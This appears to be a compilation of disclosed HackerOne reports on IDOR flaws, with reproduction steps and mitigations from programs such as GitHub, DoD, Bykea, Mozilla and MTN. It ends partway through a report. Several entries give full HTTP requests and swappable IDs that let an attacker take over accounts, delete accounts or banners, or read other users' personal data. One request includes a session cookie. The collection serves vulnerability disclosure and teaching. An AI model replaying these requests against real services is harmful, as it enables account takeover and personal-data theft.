# Insecure Direct Object Reference (IDOR)

_97 reports — High/Critical, disclosed_

### [Missing Access Control in MigrationFile allows attacker to upload files to any Migration](https://hackerone.com/reports/3506183)

- **Report ID:** `3506183`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitHub
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2026-03-05T02:23:08.428Z
- **CVE(s):** CVE-2026-1355

**Summary (team):**

A Missing Authorization vulnerability was identified in GitHub Enterprise Server that allowed an attacker to upload unauthorized content to another user’s repository migration export due to a missing authorization check in the repository migration upload endpoint. By supplying the migration identifier, an attacker could overwrite or replace a victim’s migration archive, potentially causing victims to download attacker-controlled repository data during migration restores or automated imports. An attacker would require authentication to the victim's GitHub Enterprise Server instance

---

### [Unauthenticated Users Can Access Other Users’ Bug Report Attachments via Broken Access Control](https://hackerone.com/reports/3259610)

- **Report ID:** `3259610`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @azraeldeathangel
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:51:30.558Z
- **CVE(s):** -

**Vulnerability Information:**

The `/BugReport/Admin/Attachment/{id}` endpoint exposes attachments linked to private bug reports.
By manipulating the numeric ID in the URL, it’s possible to access attachments belonging to other users, including sensitive bug reports, without proper authorization checks.

This vulnerability works **even when unauthenticated**, meaning anyone who knows or guesses valid IDs can retrieve attachments.
This is a classic **Insecure Direct Object Reference (IDOR)**, where the application fails to enforce access control on a direct object reference (the ID).

## References
- [OWASP Top Ten 2021 – A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

## Impact

This vulnerability allows an attacker to access attachments from private bug reports submitted by other users by simply manipulating the ID parameter in the request. Since the endpoint lacks proper authorization checks and even responds when unauthenticated, sensitive internal information, such as unpatched security issues, confidential business data, or personally identifiable information, could be fully exposed. This significantly increases the risk of targeted attacks, information leaks, and reputational damage to the organization.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Log in with any valid user account.
2. Capture the request when viewing a bug report attachment:
```
GET /BugReport/Admin/Attachment/1568600 HTTP/1.1

Host: █████████

Cookie: ████
```


3. Remove the entire `Cookie` header from the above request, so it looks like:
```
GET /BugReport/Admin/Attachment/1568600 HTTP/1.1

Host: █████████
```
4. Send the modified request without any authentication cookies.  
5. Observe that the server responds with the file contents of the bug report attachment.

**Result:** Any unauthenticated user can view attachments of any bug report by enumerating or guessing valid IDs.

## Suggested Mitigation/Remediation Actions
- Implement strict authorization checks on the `/BugReport/Admin/Attachment/{id}` endpoint to verify that the requesting user has permission to access the specified attachment.  
- Ensure that unauthenticated requests cannot retrieve any sensitive resources by enforcing authentication at this endpoint.  
- Use indirect references (e.g., random UUIDs or tokens) instead of sequential numeric IDs to reduce the risk of enumeration.  
- Apply the principle of least privilege: users should only be able to access resources they are explicitly authorized to view.  
- Add proper logging and monitoring for unauthorized access attempts to detect potential exploitation early.  
- Consider rate limiting to prevent mass enumeration of IDs.

---

### [IDOR Exposes PII of Tens of Thousands of Users and Supervisors](https://hackerone.com/reports/2967032)

- **Report ID:** `2967032`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @tacnull
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:42:31.047Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
While using the system as intended (submitting a SAAR), I noticed there is an insure direct object Reference vulnerability in the application. Users can modify the URL parameter `saarnId` to view and possibly edit other user's SAARs.
**CAC Required**

## References
https://cwe.mitre.org/data/definitions/639.html
https://cwe.mitre.org/data/definitions/284.html

## Impact

This vulnerability leaks the following information on tens of thousands of users:
* Address
* Full Name
* Email
* Phone Number
* DoB
* Supervisor
* DODID Number
* Controlled Unclassified Information
* Clearance Level
* User ID

## System Host(s)
███████

## Affected Product(s) and Version(s)
N/A

## CVE Numbers


## Steps to Reproduce
1. Navigate to the following endpoint: █████
2. Change the parameter value: saarnid to a lower number. 
3. View the information associated with the SAAR another user's SAAR.

## Suggested Mitigation/Remediation Actions
You can prevent Insecure Direct Object References (IDOR) by using secure identifiers (e.g., UUIDs) and verifying permissions.

---

### [IDOR Vulnerability in Banner Deletion ](https://hackerone.com/reports/3401612)

- **Report ID:** `3401612`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Revive Adserver
- **Reporter:** @cyberjoker
- **Bounty:** - usd
- **Disclosed:** 2025-11-19T09:35:06.567Z
- **CVE(s):** CVE-2025-52670

**Vulnerability Information:**

## Summary

I found an IDOR vulnerability in Revive Adserver's banner deletion endpoint that lets any Manager delete banners belonging to other Managers. The code validates access to the parent campaign but doesn't check if the user owns the specific banner being deleted. This means Manager A can sabotage Manager B's ad campaigns by deleting their banners.

---

## Description

The `/www/admin/banner-delete.php` endpoint is vulnerable to Insecure Direct Object Reference (IDOR). When I tested it, I could delete another manager's banners by manipulating the `bannerid` parameter while keeping my own valid `clientid` and `campaignid`.

Here's what happens: The endpoint checks if I have access to the client and campaign (lines 30-31), but it never verifies I own the specific banner I'm trying to delete (missing check at line 32). The code then loops through the provided banner IDs and deletes them without any ownership validation (lines 40-48).

I discovered this while comparing similar deletion endpoints. The `campaign-delete.php` file properly validates ownership inside the loop, but `banner-delete.php` doesn't.

---

## Steps to Reproduce

### Prerequisites
- Two Manager accounts (Manager A - attacker, Manager B - victim)
- Each manager has their own client, campaign, and banners
- Revive Adserver 6.0.1 running

### Exploitation Steps

1. **Login as Manager A** (attacker)
   - Navigate to `http://localhost:8080/www/admin/`
   - Login with Manager A credentials

{F4938082}

   *Manager A successfully authenticated and viewing dashboard*

2. **Navigate to your campaign's banner page**
   ```
   http://localhost:8080/www/admin/campaign-banners.php?clientid=100&campaignid=100
   ```
   (Use your own clientid and campaignid)

{F4938090}

   *Manager A viewing their legitimate banner - note the CSRF token in the Deactivate link*

3. **Extract CSRF token**
   - Open browser DevTools → Network tab
   - Look for any action link (Deactivate/Delete)
   - Copy the `token` parameter value (32-character hex string)
   - Example: `token=9fec0e8e46e9eb237d67d3da6e3e615b`

4. **Identify victim's banner ID**
   - Banner IDs are sequential integers
   - You can enumerate them or get them through other means
   - For this test: victim's banner ID is 2001

5. **Craft malicious deletion URL**
   ```
   http://localhost:8080/www/admin/banner-delete.php?token=<YOUR_TOKEN>&clientid=100&campaignid=100&bannerid=2001
   ```
   - `token`: Your valid CSRF token (from step 3)
   - `clientid=100`: YOUR client ID (passes authorization check)
   - `campaignid=100`: YOUR campaign ID (passes authorization check)
   - `bannerid=2001`: VICTIM's banner ID (NO check!)

6. **Execute the attack**
   - Paste the crafted URL into your browser's address bar
   - Press Enter (within the same session)
   - You'll get redirected with a "Banner has been deleted" confirmation

{F4938094}

   *CRITICAL: Green success message confirms Manager B's banner was deleted by Manager A*

## Impact

This vulnerability allows horizontal privilege escalation between managers. Here's what an attacker can do:

1. **Campaign Sabotage** - Delete competitors' banners to disrupt their ad campaigns
2. **Revenue Loss** - Victims lose active advertisements and potential revenue
3. **Reputation Damage** - Affected clients may lose trust in the platform
4. **Data Integrity Violation** - Unauthorized deletion bypasses audit controls

### Attack Characteristics

- **Low Privilege Required:** Only needs a Manager account (not Admin)
- **Easy to Exploit:** Simple parameter manipulation, no special tools needed
- **Stealthy:** Looks like a legitimate deletion in logs
- **Scalable:** Can be automated to delete multiple banners
- **Cross-Context:** Manager in Agency X can attack Manager in Agency Y

---

### [Authentication Bypass in Subscription Management Endpoint](https://hackerone.com/reports/3417162)

- **Report ID:** `3417162`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** lemlist
- **Reporter:** @0hmz
- **Bounty:** - usd
- **Disclosed:** 2025-11-17T13:08:04.027Z
- **CVE(s):** -

**Summary (team):**

A vulnerability was identified in the subscription management functionality that allows unauthorized access to customer billing information. The issue stems from insufficient authentication and authorization controls on an API endpoint, which could potentially be exploited to access sensitive customer data.

## Technical Details:
The vulnerability affects the subscription management API endpoint
Missing authentication requirements allow unauthorized access
The issue is classified as an Insecure Direct Object Reference (IDOR) vulnerability
Customer identifiers can be manipulated to access other users' data

## Resolution:
The vulnerability has been promptly addressed and fixed by the development team.

---

### [Arbitrary Read of Another Users private repository without Authorization](https://hackerone.com/reports/3124517)

- **Report ID:** `3124517`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitHub
- **Reporter:** @furbreeze
- **Bounty:** 10000 usd
- **Disclosed:** 2025-09-23T22:18:14.772Z
- **CVE(s):** CVE-2025-8447

**Summary (team):**

An improper access control vulnerability was identified in GitHub Enterprise Server that allowed users with access to any repository to retrieve limited code content from another repository by creating a diff between the repositories. To exploit this vulnerability, an attacker needed to know the name of a private repository along with its branches, tags, or commit SHAs that they could use to trigger compare/diff functionality and retrieve limited code without proper authorization. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.18, and was fixed in versions 3.14.17, 3.15.12, 3.16.8 and 3.17.5.

[CVE-2025-8447](https://www.cve.org/cverecord?id=CVE-2025-8447)

---

### [Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure](https://hackerone.com/reports/2374730)

- **Report ID:** `2374730`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Bykea
- **Reporter:** @back2arie
- **Bounty:** - usd
- **Disclosed:** 2025-06-13T04:36:06.142Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Dear Security Team,

I hope this report finds you well,

I would like to report an issue where a malicious user could see other users booking detail, bids information & bids config. The vulnerable URL endpoint are:

```text
1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}
```

In this case, the `booking_id` in the request URL is vulnerable to IDOR.

## Steps To Reproduce:

1. Create 2 users `attacker` and `victim`, in this case, the `attacker` is a passenger with username `█████████` & the `victim` is a passenger with username `██████████`.

2. As `victim`, perform authentication to get `user_id` & `access_token`.
3. As `victim`, create a new trip.

    Request:

    ```json
    POST https://api.bykea.net/api/v1/trips/create

    Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169

    Body:
    {
        "advertisement_id": "REDACTED",
        "token_id": "{{access_token}}",
        "pickup_info": {
            "lng": 67.883339799999931,
            "lat": 29.5500097,
            "address": "Ø³Ø¨Û, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, 82000, Ù¾Ø§Ú©Ø³ØªØ§Ù"
        },
        "trip": {
            "creator": "iOS",
            "service_code": 23,
            "lng": 67.883339799999931,
            "lat": 29.5500097,
            "customer_bid": 75
        },
        "dropoff_info": {
            "address": "Kurak, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, Ù¾Ø§Ú©Ø³ØªØ§Ù",
            "lat": 29.573396420702664,
            "lng": 67.898040153086185
        },
        "_id": "{{user_id}}"
    }
   ```

    Response:

    ```json
    {
        "code": 200,
        "success": true,
        "message": "Trip creation successful",
        "data": {
            "trip_id": "███████",
            "trip_no": "PKX████████",
            "passenger_id": "██████████",
            "dt": "2024-02-15T13:49:44.841Z",
            "link": "https://track.bykea.net/PKX██████",
            "nc": true
        }
    }
    ```

    We successfully created a new trip/ booking with id `██████`.

4. Now as `attacker`, perform authentication to get `user_id2` & `access_token2`.
5. As `attacker`, perform a request to the booking detail API endpoint.

    Request:

    ```json
    GET https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}

    Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169
    ```

    Response:

    ```json
    {
        "code": 200,
        "success": true,
        "message": "Successfully loaded booking details",
        "data": {
            "_id": "█████",
            "times": {
                "total_est": 480
            },
            "distances": {
                "total_est": 3241
            },
            "fare": {
                "actual": 75,
                "upper": 80,
                "lower": 66,
                "pre_actual": 81
            },
            "factors": {
                "areaFactor": 1,
                "profileFactor": 0.92
            },
            "shipper_feedback": false,
            "picker_feedback": false,
            "consignee_feedback": false,
            "parcel_insurance": false,
            "return_trip": false,
            "trip_no": "PKX██████",
            "trip_type": "Sawari",
            "is_deleted": false,
            "is_verified": false,
            "est_fare": "81",
            "est": 75,
            "isDispatcher": false,
            "isDropOffInitial": false,
            "isPromo": false,
            "est_distance": 0,
            "creator_type": "iOS",
            "is_cod": false,
            "received_by_name": "",
            "received_by_phone": "",
            "received_by_cnic": "",
            "decision": [],
            "rule_ids": [
                "███",
                "█████████"
            ],
            "cart_items": [],
            "customer_insurance": false,
            "customer_voucher": false,
            "paid_by": "shipper",
            "passenger_id": "████████",
            "trip_status_code": 23,
            "curLat": "29.5500097",
            "curLng": "67.88333979999993",
            "pickup_lat": "29.5500097",
            "pickup_lng": "67.88333979999993",
            "start_address": "سبی, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, 82000, پاکستان",
            "end_lat": "29.573396420702664",
            "end_lng": "67.89804015308619",
            "end_address": "Kurak, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, پاکستان",
            "dropoff_lat": "29.573396420702664",
            "dropoff_lng": "67.89804015308619",
            "dropoff_address": "Kurak, تحصیل سبی, ضلع سبی, سبی ڈویژن, بلوچستان, پاکستان",
            "customer_bid": 75,
            "extra_params": {
                "customer_app_version": "1.0.169",
                "rebooking_count": 0,
                "is_passenger_block": false,
                "searchViaScore": true
            },
            "status": "cancelled",
            "session": "█████",
            "city": "643cb7378675551df33df5ab",
            "edt": "2024-02-15T13:49:44.841Z",
            "fare_factor": 0.92,
            "order_id": "█████████",
            "created_at": "2024-02-15T08:44:44.997Z",
            "trip_number": 170955617,
            "__v": 0,
            "link": "https://track.bykea.net/PKX███████",
            "rules": {
                "onExpire": "sendToLoadboard",
                "onCancelByPartner": "reopenOnLoadboard",
                "onCancelByCustomer": "cancelOnLoadboard"
            },
            "updated_at": "2024-02-15T08:44:45.054Z",
            "discounted_fare": 81,
            "eligibleForDropoffDiscount": true,
            "insurance_amount": 0,
            "cancel_by": "Customer",
            "cancel_reason": "No Partner is available",
            "cancelled_at": "2024-02-15T08:45:21.657Z"
        }
    }
    ```

    As we can see, we are able to retrieve the booking details of the `victim`.

6. As `attacker`, retrieve bids information of the `victim`

    Request:

    ```json
    GET https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}

    Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169
    ```

    Response:

    ```json
    {
        "code": 200,
        "success": true,
        "data": {
            "bids": [],
            "dt": 1707988055001,
            "is_discounted": false
        }
    }
    ```

    As we can see, we can retrieve bid information from the booking of the `victim`. In this case, it's empty since I canceled the booking, but in a real-life scenario, it should be filled up with bids from the partner/ driver.

7. As `attacker`, retrieve bids config from the booking of the `victim`.

    Request:

    ```json
    GET https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████

    Headers:
    X-Lb-User-Id: {{user_id2}}
    X-Lb-User-Token: {{access_token2}}
    ```

    Response:

    ```json
    {
        "code": 200,
        "message": "success",
        "data": {
            "bid_values": [
                20,
                40,
                60,
                80,
                100,
                120,
                140,
                160,
                180,
                200
            ],
            "durations": [
                3,
                3,
                3
            ],
            "hash": "██████████"
        }
    }
    ```

## Mitigation

For the fix, this can be done by checking whether the booking/ trip `id` is owned by the logged-in user, by checking from their access token.

## Supporting Material/References:

- [[MITRE] CWE-639: Insecure Direct Object Reference (IDOR)](https://cwe.mitre.org/data/definitions/639.html)
- [[PortSwigger] Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)

## Impact

1. Attacker could see sensitive information from other users booking details, such as `pickup location`, `drop-off location`, `phone`, `tracking`, etc.
2. Attacker could see bids information from other users booking details.
3. Attacker could see bids config from other users booking details.

---

### [IDOR: Account Deletion via Session Misbinding – Attacker Can Delete Victim Account](https://hackerone.com/reports/3154983)

- **Report ID:** `3154983`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mozilla
- **Reporter:** @z3phyrus
- **Bounty:** - usd
- **Disclosed:** 2025-06-03T08:38:03.802Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A critical vulnerability in the Firefox Accounts API allows an authenticated attacker to permanently delete any user's account by sending a `POST /v1/account/destroy` request using attacker session, but including the victim’s `email` and `authPW` (password hash) in the JSON payload. The server fails to verify that the session making the request belongs to the account being deleted.

## Steps To Reproduce:
1. Login to the victim's account.
{F4367852}

2. Use Burp Suite to intercept a request to the endpoint https://api.accounts.firefox.com/v1/account/destroy when deleting the account. Capture the JSON body, for example:
```
{
"email": "victims344@gmail.com",
"authPW": "42b4c2940fe2efecce851a2d8e9754d0f1cb1d37e3ccaabb060f9ac21900caff"
}
```
███████

3. Then cancel the request (don't let it reach the server).

4. Login to the attacker's account.
████████

5. Again, use Burp Suite to intercept a request to the same endpoint https://api.accounts.firefox.com/v1/account/destroy when deleting the account. Send it to the Repeater and cancel the request.
██████

6. In the attacker's request, replace the JSON body with the victim's harvested data:
```
{
"email": "victims344@gmail.com",
"authPW": "42b4c2940fe2efecce851a2d8e9754d0f1cb1d37e3ccaabb060f9ac21900caff"
}
```
Send the request.
{F4367860}

7. The server accepts the request and deletes the victim's account, even if it was from the attacker's session.
{F4367861}

## Impact

**==Allows attackers to delete victim accounts without permission.==**

**Summary (team):**

An IDOR vulnerability was identified in the Firefox Accounts API endpoint `https://api.accounts.firefox.com/v1/account/destroy` that allows an authenticated attacker using SSO (i.e Google login) to delete a user's account using their email address if they are also registered using SSO. The server fails to verify that the session making the deletion request belongs to the account being deleted.

---

### [Sale cancellations from other sellers without restrictions](https://hackerone.com/reports/2495989)

- **Report ID:** `2495989`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MercadoLibre
- **Reporter:** @capablanca0
- **Bounty:** - usd
- **Disclosed:** 2025-03-06T19:52:26.694Z
- **CVE(s):** -

**Summary (team):**

We thank @capablanca0 for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.

**Summary (researcher):**

An attacker was able to cancel all MercadoLibre sales. I think I saved a few million 😉😎

---

### [Insecure Direct Object Reference (IDOR) in GraphQL deleteProfileImages Mutation](https://hackerone.com/reports/2968039)

- **Report ID:** `2968039`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Autodesk
- **Reporter:** @alphahacks
- **Bounty:** - usd
- **Disclosed:** 2025-02-21T22:18:40.262Z
- **CVE(s):** -

**Summary (team):**

An IDOR (Insecure Direct Object Reference) vulnerability was found on Autodesk User Profile, through the "id" parameter which could have allowed an attacker to delete another user's photo. Autodesk has fixed the vulnerability and we thank @alphahacks for reporting this issue.

---

### [Unauthorized Reservation Cancellation Through IDOR Vulnerability](https://hackerone.com/reports/2944357)

- **Report ID:** `2944357`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Yelp
- **Reporter:** @no-need
- **Bounty:** - usd
- **Disclosed:** 2025-01-29T17:50:26.871Z
- **CVE(s):** -

**Summary (team):**

It is possible to cancel a reservation by knowing the reservation id, this is because the reservation feature does not require users to login. We were already aware of this issue.

**Summary (researcher):**

It is possible to cancel a reservation just by knowing the reservation id

This was closed as a duplicate of an issue from 2019. Furthermore, knowing the reservation ID is not difficult since it is present in the URLs that people share on social media when they share their reservations. We fundamentally disagree on the conclusion of this report but nonetheless, I appreciate Yelp disclosing the issue

---

### [█████████ when adding branches to your account](https://hackerone.com/reports/2756402)

- **Report ID:** `2756402`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mars
- **Reporter:** @kh4rish34v3n
- **Bounty:** - usd
- **Disclosed:** 2024-11-26T19:35:29.443Z
- **CVE(s):** -

**Summary (team):**

A vulnerability has been identified in the branch addition functionality of the Royal Canin specialized channel website ██████████. The issue is classified as an Insecure Direct Object Reference (IDOR) vulnerability, which allows unauthorized users to add branches to any account by manipulating the customer's routing number (RUT) in the request parameter.

---

### [Upload profile photo and  Pets addition - IDOR](https://hackerone.com/reports/2393021)

- **Report ID:** `2393021`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mars
- **Reporter:** @ozilll
- **Bounty:** - usd
- **Disclosed:** 2024-11-21T21:09:51.062Z
- **CVE(s):** -

**Summary (team):**

An Insecure Direct Object Reference (IDOR) vulnerability is discovered on the website ██████████. Through this vulnerability, it is possible for an attacker to manipulate any user account by uploading profile photos and adding pets to victim accounts. The vulnerability exists in two main functionalities: the profile photo upload feature and the pet addition system. By manipulating specific parameters in the requests, unauthorized modifications to other users' accounts can be performed without proper authorization checks

---

### [IDOR at mtnmobad.mtnbusiness.com.ng leads to PII leakage. ](https://hackerone.com/reports/1773609)

- **Report ID:** `1773609`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MTN Group
- **Reporter:** @hazemhussien99
- **Bounty:** - usd
- **Disclosed:** 2024-10-05T10:28:36.209Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello team, i found an IDOR at `https://mtnmobad.mtnbusiness.com.ng/` that allows an attacker to enumerate data such as personal phone number and and account information justt from knowing the email.

The vulnerable request is the following:
```
POST /app/getUserNotes HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 195
Origin: https://mtnmobad.mtnbusiness.com.ng
Connection: close
Referer: https://mtnmobad.mtnbusiness.com.ng/
Cookie: G_ENABLED_IDPS=google; connect.sid=s%3ATYGgZ8wqgEinB9zX0d7-OdZyt2jXa_ev.hQw0FOvTD5bB159jCtqA%2BXv7z%2FHROL%2B2vSS6mNK%2FqVg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"params":{"updates":[{"param":"user","value":{"userEmail":"<PUT_VICTIM_EMAIL_HERE>"},"op":"a"}],"cloneFrom":{"updates":null,"cloneFrom":null,"encoder":{},"map":null},"encoder":{},"map":null}}
```

Simply replace the place holder `<PUT_VICTIM_EMAIL_HERE>` with the victim's email and you can see private data about his account such as phone number and account information, as you can see that's PII information being leaked.

## Impact

PII leakage.

---

### [Email Takeover leads to permanent account deletion](https://hackerone.com/reports/2587953)

- **Report ID:** `2587953`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @prakhar0x01
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:40:22.210Z
- **CVE(s):** -

**Vulnerability Information:**

Hii Triager,

**NOTE: Just to clarify, I reported a similar issue yesterday, but it was on a different endpoint. _In this report, the vulnerable domain is the same, but the endpoint is different._**

I found that an attacker can change their email address to the victim's(existing user) email, which then leads to permanent account deletion of the victim's account.

User-A: Attacker
User-B: Victim

Both User-A & User-B are registered user & have their separate accounts on `https://www.██████████/852585B6003EBA25/CreateAccount.html`

## Impact

- Possible Account Takeover (Probably)
- Permanent Account Deletion
- Improper Authentication on change email functionality.

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Login to Attacker's account, User-A (`attacker@email.com`)
2 - Login to Victim's Account, User-B (`victim@email.com`)
3 - In the Attacker's account, Navigate to the `Change Your Email Address` section.
4- Change the **Attacker's email** to **`victim@email.com`**. You can successfully take over the victim's email. (probably victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials

 - This is the indication of an **Email Takeover of the victim's account**

6 - Now, Navigate to the Attacker's account & change the email back to `attacker@email.com`
7 - Navigate to the Registration page, Enter the victim's email `victim@email.com` & click `Check Availability`. You'll see that the victim's email is deleted from the DB & available for a new account.

- This is the indication of **Permanent deletion of the Victim's account. **

## Video PoC

████

## Suggested Mitigation/Remediation Actions
- Set proper authentication on the Update Profile functionality.

---

### [Unauth IDOR to mass account takeover without user interaction on the ███████ (https://███████.edu/)](https://hackerone.com/reports/685338)

- **Report ID:** `685338`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:29:39.972Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
During poking around █████/24 range - AS257 ██████ looking for the Cisco devices, I came across virtual host https://██████████.edu/ on the ██████████
While it's a not .mil host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.

I discovered IDOR possibility to mass accounts takeover just by altering a numeric ID.
Resource seems to have ~320 000 accounts (the users ID is incremental and started for me from 320573), and all of them can be taken over with simple automation.

##POC
1) You need to register some test accounts using:
████
Make sure your password are not too long (resource can strip it). Something like 6-7 chars should be ok.
2) When registering, monitor the requests. Once you press the final "Register" button, the request to the 
https://██████.edu/chkUser.aspx endpoint wil be issued.
Write down the numeric `UID` parameter in the response.
████████
3) Login with your account to check it works.
4) Logout .
5) Issue next unauth POST request (replace `UID` parameter by your numeric UID you noted earlier):
```
POST /chkUser.aspx HTTP/1.1
Host: ██████.edu
Connection: keep-alive
Accept: */*
Origin: https://██████████.edu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Referer: https://████.edu/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Content-Length: 281
Content-Type: application/x-www-form-urlencoded

dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago
```
6) Your email will be changed to the `dummyemail@dummy.tld`
You can login with this email and your password to check it works. You will be unable to login with old email.
Attacker may use it flaw to point account to his email and then initiate password reset.

Note, that endpoint is also vulnerable to the CSRF in same time, since there is no any CSRF protection (it worth to fix tho), but I'm reporting here IDOR since it poses much more risks.

##Notes
In terms of transparency I should notify that during testing, I accidentally could affect single account with ID `320572` (my accounts were `320573`, `320574` and `320575`).
I never expected that unauth request will actually work, and instead incrementing my ID I accidentally decremented it and likely changed someone's email to the `test@test.test`. This user will likely be unable to login, so it worth to identify him and giving this email (or restore original) so he/she will be able to login (password was unchanged, and I didn't access account itself). I have no evidence does this account active, inactive or ever exist, just notify that it **could** be affected.

##Suggested fix
Check that UID belongs to the current user session, or better drop this parameter at all, and allow to change the user data based on the current authenticated session.

## Impact

Takeover any user account without interaction by changing the email via numeric ID. Attacker can after initiate password reset and authorize on behalf of the victim.
The endpoint is also vulnerable to the CSRF.

---

### [IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= [HtUS]](https://hackerone.com/reports/1626508)

- **Report ID:** `1626508`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @berserker22
- **Bounty:** 500 usd
- **Disclosed:** 2024-06-27T17:31:00.723Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hey team, I have found this API endpoint leads to leaking attachments and documents of users. The attachments leaked are banks taxes, contracts, PII such as full address and mobile number, emails, etc. The vulnerable URL is at [https://www.████████/Download.aspx?id=4675]

##Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Go to this URL [https://www.█████████/Download.aspx?id=4675]
  2. Add any desired id 
  3. then you will see a variety of sensitive files and contracts which contain PIIs and other classified documents

## Impact

An unauthenticated attacker is able to obtain PII of users and soldiers also an attacker is able to leak classified documents

---

### [Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint](https://hackerone.com/reports/2487889)

- **Report ID:** `2487889`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @bate5a
- **Bounty:** - usd
- **Disclosed:** 2024-05-23T20:24:06.125Z
- **CVE(s):** -

**Vulnerability Information:**

### Hi H1 i hope you are Doing Well Today :)



### Explaining

